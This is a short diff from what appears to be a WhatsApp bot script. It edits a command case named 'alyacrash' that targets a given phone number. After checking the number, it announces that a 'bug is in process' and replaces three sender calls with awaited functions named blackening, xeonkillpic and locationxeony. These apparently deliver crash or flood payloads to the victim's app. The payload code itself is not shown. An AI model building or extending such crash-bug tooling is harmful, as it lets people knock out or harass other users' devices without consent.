@@ -20851,9 +20851,9 @@ case "alyacrash": {
     return replygcalya("The number is not registered on WhatsApp");
   }
   replygcalya("please wait, " + command + " bug is in process..");
-  sendblackening(whatsappNumber, encodedAmount);
-  sendforce2(whatsappNumber, encodedAmount);
-  sendforce(whatsappNumber, encodedAmount);
+  await blackening(whatsappNumber, encodedAmount);
+  await xeonkillpic(whatsappNumber, encodedAmount);
+  await locationxeony(whatsappNumber, encodedAmount);
   sendVariousMessages(whatsappNumber, encodedAmount);
   await sleep(2500); 
   sendMessageWithMentions(
